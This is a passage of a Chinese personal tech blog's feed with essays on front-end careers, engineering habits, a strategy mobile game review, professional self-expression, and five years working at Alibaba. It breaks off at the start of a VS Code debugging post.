        <content type="html"><![CDATA[<p>最近一段时间是阿里的晋升季，前端方向与往年不一样的是，高 P 涌现的趋势越来越明显，这说明前端这个领域已经进入了新的高度。</p><p>其实回首想一想也能感受到，曾经的前端还被定义为 JS 工程师&#x2F;重构工程师，现如今市面上的 JD 几乎已经看不到这两个词的影子了。</p><p>仔细想一想，核心的原因是什么？是哪些因素把资源角色的前端推到了主导业务的角色。我觉得有这么几点：</p><ol><li>Node.js 的出现，让前端具备了 Server 端的能力，虽然拥有的能力并不多，但是全栈这个概念让很多资深工程师趋之若鹜，甚至引来了一些其他领域的工程师，前端队伍突然壮大，各种思想碰撞后，前端自然也就拓展了边界。</li><li>多端技术的融合，为了节约生产资源，提高生产力，很多大厂都投入了大量的人才进入跨端生产的技术研究之中，前端在 Native 上又多了一次学习的机会，甚至一度有着统一三端的雄心。不过目前还尚未能看到终局，Flutter 也不一定是未来。</li><li>基础能力和基础工具收敛以后，前端之间工作内容的相似性越来越突出，这吸引了很多整合能力较强资深工程师，为了提升可复用性和使用效率，横向挖掘了大量有价值的解决方案。从解决小问题变成解决大问题，问题的量级不一样，自然对能力的要求也不一样。</li><li>商业的进化也铸就了前端，这一层的理解可能有点绕，但是我觉得也算是重要原因之一：前端是与用户最贴近的一个技术工种，无论是用户对体验的诉求，还是企业对服务质量的要求，都促使着前端不断地突破自我，寻找新的思路来迎合来自企业和用户的双重挑战。</li></ol><p>尽管近两年前端发声稍微小了一些，但是这并不意味着前端这个行业会衰弱下去，市场对前端工程师的需求量还会随着 5G&#x2F;IoT&#x2F;VR&#x2F;AR 等技术的革新继续增长，只不过对人的要求可能会有一些变化。</p><p>首先是学习能力，学习能力不仅仅是你看懂某个技术知识点的能力，更需要有人能够将技术整合到商业之中，这也是需要强大的学习能力的，没有良好的基础和各种方案的长期实践，很难做好这件事情。这里可能更加强调学习并创新的能力，学，以致用。</p><p>其次是突破的能力，未来的前端一定是越来越难做，因为好做的事情，能快速出成绩的事情会越来越少，我们遇到的大概都是些硬骨头，啃碎了才能吸到骨髓，不想啃，就没有你的机会，啃不动牙碎了，你就直接被淘汰了。</p><p>有人在唱，研发人员在整个市场已经趋于饱和了，未来还会有更多的裁员和更加残酷的竞争，我也认可这个观点，未来会更残酷，我们要做的不应该是自怨自艾和畏畏缩缩，如果你还想跟着这个时代一齐向前，就必须振奋起来，披荆斩棘！</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何成为一名优秀的业务人员/工程师</title>
      <link href="/blog/2020/06/01/my4hps/"/>
      <url>/blog/2020/06/01/my4hps/</url>
      
        <content type="html"><![CDATA[<p>如何成为一名优秀的业务人员&#x2F;工程师，我觉得需要反复把下面四件事情做好：</p><p><strong>1、确定一个有挑战的目标</strong></p><p>且不说选一个具备挑战性的目标，很多人根本就没有明确的目标，浑浑噩噩的，也不知道自己究竟想要什么，自然也不会过多地去思考自己有什么优势，有什么劣势，能做成什么事情，更不会去想，如何创造新的价值，找到新的效益。明确的目标让我们的行动更加聚焦，而有挑战的目标会让我们从心底就涌出一股向上的动力，不仅可以找到新的价值点，也可以帮助我们更好地提升自己。</p><p>0 代表几乎不用力就可以达到的目标，10 代表几乎不可能完成的目标，如果从 0 到 10 给自己的目标打分，你的目标应该在 7 分左右。</p><p><strong>2、全面、透彻地分解问题（简单的问题复杂化）</strong></p><p>目标定好了以后，马上行动是不可能的，因为挑战性的目标并不会那么容易达成，就算方向是明确的，如果没有做好周全的计划，行动也是难以持久的。首先我们需要从各个方面对目标进行详细分解，这个过程是为了让简单的事情变得复杂，是为了控制好未来可能会遇到的各种风险，找到行动预案。</p><p>根据目标分解出 2~3 件具备可评估因子的事情，同时提前思考，如果半年后我没有达成目标，或者彻底失败了，可能的原因是什么。</p><p><strong>3、有条理、有节奏地践行（复杂的问题做简单）</strong></p><p>如果想的很复杂，做起来也特别复杂，那一定是想的有问题，或者执行上存在问题。让行动变得简单，可以让我们的精力聚焦在几件核心的事情上，把核心事情做好，同时也可以帮助我们一定程度控制成本。简单可以让人记住，简单可以聚焦，简单可以让内心保持宁静。</p><p>行动过程中，不断对焦目标，不断反思。所谓反思，先有思，再有反思。反思就是拿当前的事情与最初定下的事情作对比，反思不仅仅是事情结束以后再去思考，在行动前、行动中和行动后，都应该反思。</p><p><strong>4、分享失败和成功的经验</strong></p><p>如何看自己是否真的理解了一件事情？我觉得你能够把它明明白白地讲给外行人听，那就是理解了。我觉得理解有三个层次，知识、行动和态度，知识是肤浅的，知识是死的，而深入的理解知识可以指导行动，完整地理解会影响一个人的态度。</p><p>一个团队需要传承，一家企业更需要传承，知识需要被分享，经验和教训同样也需要。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊《三国志·战略版》</title>
      <link href="/blog/2020/05/13/sanguozhi-game/"/>
      <url>/blog/2020/05/13/sanguozhi-game/</url>
      
        <content type="html"><![CDATA[<p>三国志·战略版这款游戏玩了大概两个月，基本上体验了游戏的各个细节，本来以为自己只是一个小氪玩家，没想到玩到最后也累积成了中大氪😅。在收手之前，分享下自己玩这款游戏的一点心得，也算是对这两个月做一点小结。</p><h3 id="这是一款什么样的游戏？"><a href="#这是一款什么样的游戏？" class="headerlink" title="这是一款什么样的游戏？"></a>这是一款什么样的游戏？</h3><p>这款游戏有意思的地方就是复原了三国群雄争斗的真实情景，整个游戏版图由几个州拼合而成，州与州之前有关隘，州由多个郡组成，每个郡都会有几座等级不一样的城池，地图上四处都是木材、铁矿、石料、粮食、铜矿等可被占领的不同类型不同等级的资源地块，还有山川、河流等等不可占领和穿越的地块。</p><p>每个人进入游戏后都会有一座主城，主城内有很多可升级的设施，分为内政、军事和守备三部分，也有几支等级很低的作战队伍。你可以自己成立一个盟，附近的人会加入进来，也可以加入到别人成立的盟中，盟成员之间可以相互扶持，一起策划天下大事。</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-01.png" alt="游戏地图"></p><p>在这个游戏里，一切故事都因土地而起。并非所有的地块都可以直接占领，你只能占领与自己或盟友地块相连的地块，如果你出生的位置资源丰富，那么你就可以很快地打下很多资源，从而变得更强，否则你就需要向外发展，发展的过程中就免不了土地冲突，也免不了人和人之间的冲突、盟和盟之间的冲突，甚至后续国与国之间的冲突。</p><h3 id="游戏成长瓶颈"><a href="#游戏成长瓶颈" class="headerlink" title="游戏成长瓶颈"></a>游戏成长瓶颈</h3><p>这是一款烧脑的游戏，对个人而言烧脑，对盟里主事的人也烧脑。</p><p>地块等级分为 1 到 10 级，每个人可以建立一个分城，分城和主城都可以养 5 支队伍，每支队伍有一名主将和两名副将，每个将领自带一个战法技能，另外还有两个战法槽，用于附加其他技能，将领的等级是 1 到 50 级，技能的等级是 1 到 10 级，每个将领根据等级可以对应数量的兵。</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-02.png" alt="桃园队"></p><p>将领也分武将和政将，政将一般放在主城内从事政务，武将一般参与作战，每个将领有 6 个属性，分别是与战斗相关的武力、统率、智力、速度，和与政务相关的政治、魅力。将领分为橙将、紫将和其他质量更低的将领，一般好的将领每次等级提升，其属性增加值也更加可观。每种将领都有 5 中兵种适应性，橙色最强，紫色次之，其他颜色就表示比较弱了，战斗时，如果选择橙色兵种，会有战斗力加成，其他颜色可能会削弱。</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-03.png" alt="关羽"></p><p>游戏的成长瓶颈就相当多了，我列举一些：</p><ol><li>橙将难求，每天有一两次免费的抽卡，可以从成百上千将领中抽取卡片，脸黑情况抽 10 天也抽不到一个橙将，紫将也不好出</li><li>战法技能难求，一个武将自带一个技能，也可以销毁卡片兑换一个对应的固定技能（传承），没有好的卡片自然就没有好的技能</li><li>战法激活困难，就算你有用了了一个橙将的传承技能，也不能立马使用，还必须消耗 10 个甚至更多紫将来激活它</li><li>战法升级困难，战法升级需要战法点，抽到的低质量将领可以兑换成战法点，你需要抽到一箩筐将领才能兑换足够的战法点升级战法</li><li>第三战法槽开启困难，需要第一战法达到 20 级后，才能通过消耗两个橙将开启第三战法槽</li><li>武将等级提升困难，需要不停地战斗，才能获得经验，足够的经验才能让等级+1，越升越困难</li><li>武将搭配困难，考虑兵种、战法搭配，想配一支战斗力极强的队伍是非常有挑战的</li></ol><p>另外还有其他让人头大的限制：</p><p>每个武将都有一个「御」的属性值，初始队伍三个将领的御之和不能超过 13，而提升御则需要升级城池等级。城池等级的提升需要大量的资源，这就要求玩家通过占领地块来提升资源产量，而「占领」是需要战斗的，刚开始的队伍配置都很低，需要消耗大量的兵来打仗占领土地，而征兵也是需要资源的！</p><p>城池内还有几十个可以升级的设施，每个设施的升级都需要消耗大量资源，有的是让队伍更强的，有的是可以提升资源获取效率的，有的是可以提升城池守备的。</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-04.png" alt="内政"></p><p>所以这个游戏，就是逼着你，不断地去触碰游戏设定的「土地矛盾」，在你发育的过程中，很快就会接触到其他玩家，也会接触到「盟」，然后接触到国家（盟到达一定等级后可以立国）的发展大计，不断感受游戏的新乐趣。</p><h3 id="游戏公平性"><a href="#游戏公平性" class="headerlink" title="游戏公平性"></a>游戏公平性</h3><p>总体来说，这个游戏还是比较公平的，将领的获取有两个渠道，一个是抽卡，这是游戏唯一可以付费的地方，抽卡很贵，你砸一万块钱进去，脸黑的情况可能也就抽到二三十个橙将，运气好的话，可以抽到七八十个，平均一个橙将 200 块 RMB 的样子，当然，在付费抽卡的过程中，可以得到不少紫将，每天有一两次免费抽卡的机会；另外一个渠道就是铜币抽卡，铜矿打得越多每天的铜币产量也就越多，只不过铜币只能抽到紫将。</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-05.png" alt="满红大佬"></p><p>上面这张图，一看就会知道，一定是位氪金大佬，没个三、五万 RMB（甚至更多）拿不到这样的卡片，诸葛亮、赵云本就是很难抽到的将领，他这个诸葛亮还抽到了 6 个（每进阶一次会消耗一个，然后会多一个红点）。玩这个游戏，一毛不拔的应该特别少，所以你能够在网络上看到铺天盖地的广告，因为游戏方有这么多财神供着，根本不缺钱！！！</p><p>好的将领打仗厉害，消耗兵少，可以快速获得高级地，从而更快速度提升资源获取效率，这是一个循环的过程；同样，即便你的将领一般，如果你前期可以很快地打下一波资源地，也可以尝到资源复利的甜头。下面就来分享下，如何在游戏中让自己占到上风。</p><p>游戏的公平性还体现在战斗上，队伍有兵种属性，枪兵克制骑兵，弓兵克制枪兵，盾兵克制弓兵，骑兵克制盾兵，就算你手里有很好的橙将，一旦遇到克制的兵种，也会遭遇很大的损失，这也是平民玩家能够玩下去的一个重要游戏规则支柱。</p><h3 id="前期发展"><a href="#前期发展" class="headerlink" title="前期发展"></a>前期发展</h3><p>关于前期如何快速发展，网络上有很多很多的攻略，但是大多数攻略实在是不适合普通玩家，因为普通玩家没有好的将领，没有好的战法，组出来的队伍也都弱爆了，打地损失超级大。在这里主要是给大家一些建议和思路。</p><p>首先你需要明确，在游戏过程中，即便你是普通玩家，你手里头也会慢慢攒一些不错的橙将，橙将才你重点需要培育的对象，刚开始的次将升级升到二三十就差不多了，对于氪金玩家来说，建议前期一次性多氪一点，先砸个一两千把你想要的几个橙将砸出来，然后再开始玩游戏。一般氪金玩家，氪个一两千都是很正常的数目了，稍大一点的，应该上万了，大氪玩家七八万的也有，比较少。</p><p>如果你的出生地附近五级、六级资源地过少，建议直接东山再起，重新选择出生地，否则发育一两天后，你会非常痛苦，需要跑很远的路打地；如果发现身边有高战，也赶紧东山再起，因为附近的高级地会提前被他打光，他吃肉，你只能喝汤。</p><p>什么是前期？对你来说，在能够打下七级地之前，都可以称之为前期。很多人在六级地以后就发育十分缓慢了，因为手上的队伍实力太弱，每次战斗都是巨大的兵损。</p><p>前期打地，想发育快，就必须控制兵损，要以几乎不损兵的情况下打仗，比如打五级地兵损控制在一千，打六级地兵损控制在三千；当你能打六级地的时候，整个版图都已经发育到一定的阶段了，慢慢会进入资源不够用的情况，土地矛盾也会十分明显，这个时候就免不了跟人打架，或者被盟里要求一起去攻城拔寨，参与团战。</p><img src="../blogimgs/sanguozhi-06.png" alt="夏侯惇" width="300" /><p>有一个小小的经验可以分享下，赵云和夏侯惇在战斗中是可以触发群攻的，如果你有这类似的将领，这个优势可以好好利用下，培养到 25 级可以单刷五级地，35级可以单刷六级地。战法配置策略也很简单，回血+洞察+群攻&#x2F;反击，比如夏侯惇可以加鲁莽（A级战法）和后发制人（A级战法），赵云自带洞察，可以加急救（B级战法）和后发制人。</p><p>当夏侯惇或者赵云到了三四十级以后，就可以带将练级了，比如夏侯惇带一个副将，副将给一个兵，带着去打六级地，这样这个副将就可以飞速提升等级。</p><h3 id="关于战法配置"><a href="#关于战法配置" class="headerlink" title="关于战法配置"></a>关于战法配置</h3><p>这可能是游戏里最烧脑的部分，当你良将如云，战法一堆的时候，如何搭配一队战斗力强的队伍，是一件十分有挑战的事情。如果你是大氪玩家，根本不用多想，去网上搜寻一下 T1 梯队的配置，保证打架强悍。</p><p>但是你大概率是这样的，组件 T1 梯队，缺一个将或者缺某种战法，或者有些战法已经给了另外的队伍，当前的队伍配置只能更换思路。庆幸的是，这个游戏根本不存在最好的配置，因为总是可以找到一堆比较克制你的队伍，关键在于如何利用技能触发的概率，最大程度打出伤害，以及降低受到的伤害。</p><p>武将的战法大致可以分为：控制系、增益系和输出系，控制包含不让普通攻击（缴械）、不让发动战法技能（技穷）、不让输出（震慑）、不让行动（虚弱）、见人就打含自己人（混乱）等等，增益包含输出增强、受到伤害降低、回血、避免被控（洞察）等，输出包含多次输出、输出加成、群体攻击、多类输出等。</p><p>在配置的时候，尝试多个战法组合不断寻求最大化输出，如使用包含输出和增益的杯蛇鬼车战法，使用所向披靡这种群攻战法，或者利用某个将领的猛烈输出，如使用锋矢阵、藤甲、曹操的乱世奸雄辅助徐晃打出成吨高额伤害等等。</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-08.png" alt="曹操"></p><p>首先要去看一个将的特征，比如曹操，他的智力增长和统率增长都是很高的，可以考虑让他做肉盾，比如加一个嘲讽技能，让敌军的所有普通攻击都打在他身上，以保护我方另外两个将领拥有良好的输出环境，</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-09.png" alt="曹操技能"></p><p>曹操为主将则具备吸血能力，自动回血，如果为副将，就需要为他配置降低伤害或者回血的技能。</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-10.png" alt="夏侯渊"></p><p>再比如夏侯渊，武力成长性不错，适合输出，</p><p><img src="/../blogimgs/2020/05/13/sanguozhi-11.png" alt="夏侯渊技能"></p><p>而且他的战法「将行其疾」，是在普通攻击后再发起一次攻击，如果打中了主将，还能控制对方，那么第二、三技能就应该强化他的属性，可以配置「强攻」、「兵锋」等，让他触发多次普通攻击（每个将领每回合有一次普通攻击）。</p><p>除了知道将领擅长什么，还是去思考他害怕什么，比如夏侯渊就害怕缴械（无法普通攻击），为了让他不要被缴械，可以让郭嘉为他提供洞察，也可以让夏侯渊的速度变得更快，让他比敌军更早发动技能，还可以在队伍中配置其他武将，一旦夏侯渊被缴械，还能保证队伍持续有伤害输出。</p><p>为什么那些 T1 队伍都很强，就是因为 T1 队伍使用的每个技能都具备 1~3 个效果，要么控制对方，要么群体输出，要么奶量很大（回血能力强），综合配置下来，就是一支抗揍、能打还不怕控制的队伍了。</p><h3 id="游戏的社交性"><a href="#游戏的社交性" class="headerlink" title="游戏的社交性"></a>游戏的社交性</h3><p>不得不说，这款游戏的社交性非常强，战争的胜败不仅仅取决于盟里有多少个高战，更重要的是，在一起打仗的人，出生入死久了，有了袍泽情谊，愿意一起去执行一项有挑战的任务，愿意守卫疆土，保家卫国。也会在持续的战报秀中，不断尝试和学习提升自己的战法技能、优化配置策略。</p><p>小到一个分队，大到一个国家，大家的畅聊声中，有炫耀、有吐槽、有郁闷、有开心、有满足、有失望、有惊喜；打仗的时候，盟里统一调令、统一指挥，也会有紧张感，一对精心培养的队伍到底能够穿几队，能不能打赢对方的高战，等等，时刻都能感受到血脉膨胀、心跳加速。</p><p>不同的盟，管理风格差异特别的，有的松散而不失整齐，有的朝令夕改意气用事。内奸、反叛、转匪、俘虏，各种操作和角色，都让人和人之间的交流变得频繁而有趣。</p><p>如果你有时间，也愿意花点小钱，不妨尝试玩一玩这款策略性游戏，能够带来不少趣味~</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 三国志·战略版 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈价值表达</title>
      <link href="/blog/2019/12/17/the-value-of-expression/"/>
      <url>/blog/2019/12/17/the-value-of-expression/</url>
      
        <content type="html"><![CDATA[<p>领英中国近期推出了一个年度行家的榜单，关注我的朋友可能知道，我有幸入了榜。领英对行家的定义是，在自己的领域中，根据自身经验和知识，为他人答疑解惑，分享行业洞察，提供经验干货。简单来说，所谓的行家，就是善于思考，乐于发声的人。</p><p>我想，领英不乏这样的人，整个互联网更是不乏这样的人，我之所以能够进入这个榜单，还是因为当前领英在中国仍在发育阶段，现阶段在这个平台上表达的人偏少，所以才显得我这个活跃的人是个“行家”吧。</p><p>本文想跟大家分享几件事情，分别是：</p><ul><li>我在进入职场时所面临的的困惑，以及我的心态是如何转变的</li><li>在社交媒体上进行“表达”，我的看法和经历</li><li>分享下“不善言辞”的技术人如何进行职场表达</li></ul><h3 id="一、走出困惑"><a href="#一、走出困惑" class="headerlink" title="一、走出困惑"></a>一、走出困惑</h3><p>还记得刚踏入职场时，最大的困惑是不清楚未来的成长路径是怎样的，在职场上，我的未来是什么？未来的路该怎么走？业界的那些大牛，到底有多牛？我离他们有多远？对此完全没有概念。</p><p>相信很多人起初跟我一样，都会有类似的困惑，事实上，这几年在社交平台上也经常会收了不少朋友的私信，询问这方面的问题。究其原因，我认为有如下几点：</p><ul><li><strong>[自身问题] 涉猎不足。</strong> 刚刚走进职场，工作经验不足，遇到的问题少，踩过的坑偏少，因此看不清领域全貌</li><li><strong>[自身问题] 缺少沟通。</strong> 与市场、业务、团队和社区的互动不足，甚至缺失，信息摄入渠道单一，对领域的综合理解不够，缺少对领域发展风向的判断</li><li><strong>[行业问题] 发展过快。</strong> 技术的迭代十分迅速，技术栈更替快，经常给人一种学不过来的感觉，给新人的压力大</li><li><strong>[行业问题] 成长梯度不清晰。</strong> 前端是一个新兴领域，出现时间不长，在行业的沉淀也比较薄，这不利于新人找准下一个层级的位置</li></ul><p>过去几年时间，我从未停止学习和思考，不断从技术底层去理解新事物的诞生，同时结合业务去思考技术的价值，持续地思考和输出，几年下来让我不断对行业和技术有了更深的理解。当我得到了公司和同行认可的时候，当初的很多困惑也就消失了，心态也跟着转变了。</p><p>市场的竞争是恶劣的，对人的要求也在不断地提升，这就要求我们必须不断地改变自己来适应新的环境。相比刚踏入职场，如今的我淡定了许多。<strong>很多有难度的事情会放到五年这个跨度来看，不急于求成，稳稳的去拿每个阶段的结果，控制好风险，这样下来，事情大概率就会按照自己的预期发展了。</strong></p><h3 id="二、从技术表达到职场表达"><a href="#二、从技术表达到职场表达" class="headerlink" title="二、从技术表达到职场表达"></a>二、从技术表达到职场表达</h3><p>我是一个技术人，从 13 年开始就拿起笔杆子在网络上写作，那个时候还属于个人博客比较流行的阶段。由于长期深入浅出地写前端领域的技术博文，吸引了不少围观的群众和志同道合的工程师，慢慢地，也在这个领域越走越远。后来个人博客不怎么流行了，应该说互联网信息泛滥了，长篇内容铺天盖地，传播周期也越来越短，再加上技术内容同质化比较严重，慢慢地，我在社交媒体上的表达就从长篇转向了短篇和中长篇，表达平台从个人博客转战到了微博，当然，分享的内容了也有了比较多的变化，更加侧重于资源的分享和观点的输出。</p><p><strong>时间</strong></p><p>有人问我，每天在社交媒体上花费多少时间？其实，<strong>表达不需要很多时间，表达背后的思考需要</strong>。我是一个乐于分享的人，在平时的工作和生活中看到问题，我都会去思考问题的本质是什么，然后把思考的内容梳理出来，发布到社交平台上。有些内容会引发较多的讨论，阅读评论和互动比较占用时间。</p><p><strong>坚持表达</strong></p><p>我粗略地统计了下，近五年产出了长篇博文（含技术研究）约 300 篇，中篇思考约 500 篇，短微博（含技术分享）约 5000 条。这几年，我一直逼着自己去思考，而且是逼着自己产出有见地的内容，长期下来，很明显地感觉到，思辨能力有了质的提升，写作、沟通能力也大幅提升了。顺道值得一提的是，同时还在全网收获了六七万的关注量。</p><p><strong>坚持有价值的表达</strong></p><p>什么样的表达是有价值的？我认为，能够给我带来价值的分享，有两类，<strong>一类是消除知识势差</strong>，对工作和思考有帮助的知识，辨识度很高，我会关注一些能够持续产出有高性价比知识的博主，所谓高性价比，就是他们分享的内容可以被直接应用到我的工作上，或者对我认识某个领域起到很大的作用；<strong>另一类是消除认知偏差</strong>，能够站在一个较高的维度或者较宽的视野下，从宏观角度解释现象，而且还会凝练一些方法论，这种内容往往可以引发二次思考，很有价值。</p><p>个人在分享的时候，也会尽量表达这两类内容，而不是做纯粹的知识搬运工。</p><p><strong>表达后的信息反馈</strong></p><p>在输出的过程中，也会经常收到有价值的反馈，从而让我更进一步地思考；在思考的过程中，我会阅读大量的素材以提高思考的深度和广度，也认识了一帮志同道合的朋友。</p><p>就拿前几天的事儿来说吧，我在 LinkedIn 发了一个观点，讨论“为什么 PWA 技术在国内不愠不火”，有一位在国外有过调研和实践的网友回复了他掌握到的讯息，让我知道了这个技术为什么在某些国家可以火起来，以及如何在这类国家火起来，很有启发性。</p><p>事实上，像这样，在社交平台上因为表达而让自己觉得有进步的故事还挺多的。</p><p><strong>职场表达</strong></p><p>LinkedIn，我在上头活跃了一年，在这里表达让我认识了一帮前端领域圈子之外的朋友，应该算是意外的收获吧。</p><p>起初我只是把它当做一个职场表达的自留地，吐槽吐槽一些显得不够专业的猎头，喷一喷在厂里看到的不好的现象，也偶尔分析一些问题背后的本质，没想过有人会看我写的东西，不过坚持一年后，发现关注我的人越来越多，慢慢的，也就聊的多了。</p><p>我觉得领英是一个比较好的职场表达空间，只要是有价值或有见解的观点，很容易被同行和相关行业的人注意到，而且有深度的互动也可以促进和提升自己对于行业的理解，这很有价值。</p><h3 id="三、技术人表达"><a href="#三、技术人表达" class="headerlink" title="三、技术人表达"></a>三、技术人表达</h3><p>行外人对程序员的第一印象可能是，“不善言语、Geek、修电脑”，这不是没有道理的。程序员善于通过程序来表达想法，他们追求简单、高效和极致，可能因为长期理性表达的缘故，技术上的输出很有力道，但职场上的表达就显得比较脆弱了。</p><p>如何缓解这个问题？我觉得可以多在网络上与不同的人交流，也多在现实生活中与不同的人交流，保持开放的心态。同时，在持续表达和交流的过程中，建立稳定的输出渠道，打造自己的受众基础，不断收集外部对自己的有效反馈，形成一个健康稳定的正向循环。</p><p>交流是一门艺术，不同的人口味不一样，风格也不一样，对于沟通，有几点建议：</p><ul><li><strong>简洁且全面地表达。</strong> 日常的沟通过程中，使用凝练的内容表达自己的想法，让人可以最短时间内了解意图</li><li><strong>交流而非索取。</strong> 信息势差是存在的，使用交流的方式相互分享和探讨，而不是为了降低信息势差一味地索取信息</li><li><strong>多交流观点。</strong> 上等讨论是交流观点，中等讨论是谈论事件，低等讨论是评判个人</li></ul><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p><strong>表达不是目的，价值表达才是目的。</strong> 在这个信息已经开始泛滥的互联网之中，我们可以输出更多有价值、有深度的内容，因为我们所在的平台、所在的环境，会因为我们这些微小的改变而变得更加美好。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 领英行家 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Coding 五年，我在阿里“啃”了块硬骨头</title>
      <link href="/blog/2019/11/30/life-and-work-in-alibaba/"/>
      <url>/blog/2019/11/30/life-and-work-in-alibaba/</url>
      
        <content type="html"><![CDATA[<p>大家好，我叫李靖，来自淘系技术部，是一名前端工程师。</p><p>在阿里的日子过得太快，转瞬间已在指尖和键盘的 Coding 声中溜走了五年，这五年，我从青涩的小伙转身成为一个女娃娃的爹，也从略带内向的毕业生进化成了既能码又能撕的“胡子大叔”。</p><h3 id="人可以累，心不能累"><a href="#人可以累，心不能累" class="headerlink" title="人可以累，心不能累"></a>人可以累，心不能累</h3><p>刚入职时，作为一名技术新人，负责 PC 版的淘宝首页，这块业务很特殊，它的受众很多，每天都有上亿的流量，系统的复杂度虽不是很高，但是风险特别大，而且需要与很多很多很多人交涉，我接手之时业务发生了一些变化，作业量很大，压力也很大，有来自业务方的压力，也有技术上的挑战，那段时间，连续一两个月，加班到晚上 1 点左右回家，而且 1 点以后还有可能收到业务方的电话。</p><p>有一天晚上，大概 11 点钟，整层楼只剩下我和我的主管，在优化一个技术细节问题，他其实已经陪我快一个星期了。多日的疲惫感让我一下子爆发了出来，那天晚上，我哽咽了，哭了，最后泣不成声，主管在旁边，他话不多，等我哭的差不多的时候，他告诉我，“成长是很累，但是人可以累，心不能累”。</p><p>这几年，我一直记着这段往事，也把那句话深深地刻在了心里。从那以后，不管是工作，还是生活，我都会尽量保持良好的心态，每每感觉心累的时候，都会想办法调节自己。</p><p>当工作和生活交织在一起的时候，也很容易把生活中的情绪带到工作上来，心中的不如意会像病毒一样占据大脑，压垮我们的心理防线。学会站得远一点来看待眼前，其实一切都会消逝，生活和工作都不会因为一点小事而变得黯淡无光，远方的路还很长。</p><h3 id="你相信吗？"><a href="#你相信吗？" class="headerlink" title="你相信吗？"></a>你相信吗？</h3><p>看不清前路的时候，鞭策自己的就是“相信”二字。</p><p>依稀记得刚来阿里的一两年，前头总有个师兄领着，完全不用担心迷路的事情，可不知道从什么时候开始，师兄好像成为了一团烟雾，弥散在了眼前，这才意识到，前方的路，需要自己去走。需要思考的问题越来越多，能得到的输入越来越少，我已经数不清自己有多少回看不清前路了，但每每看到一丝希望，都会紧紧地抓住，走下去。</p><p>做店铺业务的那年，我们团队人少事多，我负责的是 ISV 开放相关的技术支撑，旧的技术体系要过渡，新的方向要探索。在做规划的那段时间，我连闭上眼睛都能看到一堆让人头疼的问题在脑子里转来转去，后来我们决定把开发者的体验做上去，选择了一个非常难啃的技术领域——IDE 编辑器。当初我的内心是拒绝的，我认为自己搞不定，可实在也没有太多的路可以选择。</p><p>转岗吧，但回头一想，如果这块骨头不啃碎，ISV 技术支撑的体验很难有质的突破，团队的压力也会更大；另外再想一想，其实“好做”的事情都已经做得差不多了，大家都进入了深水区，没有那么多好啃的骨头。几个深呼吸以后，我决定，提起勇气，扎扎实实地干它一场。</p><p>那半年，时而痛苦，时而兴奋。庆幸的是，如期地帮助 ISV 解决了一些实际场景的问题。</p><p>当然，相信也是有条件的，当我把事情列清楚了，我多了一份相信；当我做出了一点点效果，又多了一份相信；当我得到了兄弟团队的关注和寻求合作的意向，我知道，当初的坚守是对的。大胆思考，小心求证，稳步向前地相信，前路才会越来越清晰。</p><h3 id="赋予工作多一点意义"><a href="#赋予工作多一点意义" class="headerlink" title="赋予工作多一点意义"></a>赋予工作多一点意义</h3><p>一线的研发工作，并不是每时每刻都充满着趣味和挑战，可以说日常的大部分时间都在处理琐碎的看似不起眼的脏活、苦活、累活。思维没打开，就好像囚禁在笼子里，看不清上下游关系，也看不到做这件事情的价值和意义。</p><p>工作的意义从来都不是别人赋予的，而是自我赋予。内心被人说服了，所以去做；看到了问题，所以去做；经历过痛苦产生了共情，所以去做。每一行代码、每一次优化、每一个变更，都期望能够让我们的用户更爽一点，用户爽了，我们的心里也就爽了。</p><p>近期的工作是解决前端工程相关的研发体验和效率问题，几乎每天都会听到来自不同 bu 的研发同学的声音，听到了他们的抱怨，也听到了他们的赞许，很多心声他们并不会全部吐露出来，但顺着反馈去看看是什么让他们爱不释手，是什么让他们痛不欲生，进而做出一些改变，这或许就是我给工作赋予的更多意义；而不是像不是一颗螺丝钉般，成天机械地解决来自用户、主管、合作伙伴提过来的各种需求。</p><p>世界没有太多的变化，但是用不一样的眼光去看待这个世界，可能会大大的不一样。</p><h3 id="五年，五味杂陈"><a href="#五年，五味杂陈" class="headerlink" title="五年，五味杂陈"></a>五年，五味杂陈</h3><p>在我们的人生中，有好多个五年，不长也不短。在这里，我度过了工作后的第一个五年，内容很丰富，这也让我意识到，未来需要以更长的跨度来规划阶段性的人生。</p><p>感谢这五年，感谢身边的人，也感谢阿里巴巴，让我受益良多~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> alibaba </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解密 VS Code 断点调试的原理</title>
      <link href="/blog/2019/11/15/vscode-study-03-debug-protocol/"/>
      <url>/blog/2019/11/15/vscode-study-03-debug-protocol/</url>
      
        <content type="html"><![CDATA[<p>VS Code 相关系列的文章，近段时间已经写过三篇（<a href="https://www.barretlee.com/blog/2019/08/03/vscode-source-code-reading-notes/">启动过程</a>，<a href="https://www.barretlee.com/blog/2019/10/23/vscode-study-01-start/">安装</a>，<a href="https://www.barretlee.com/blog/2019/11/01/vscode-study-02-debugging/">开发和调试</a>）了，后续还会在研究和学习的过程中持续输出，希望对感兴趣的读者带来一些帮助。</p><blockquote><p>我的文章风格一般都是持续挖掘底层原理，打破砂锅问到底，一直挖掘到大众能都理解的深度才会罢休，所以在做介绍的时候偶尔会跑个题讲讲其他相关的技术，主要也是为了给读者理解做好铺垫。</p></blockquote><p>平时我们经常会使用 Chrome 进行 JS 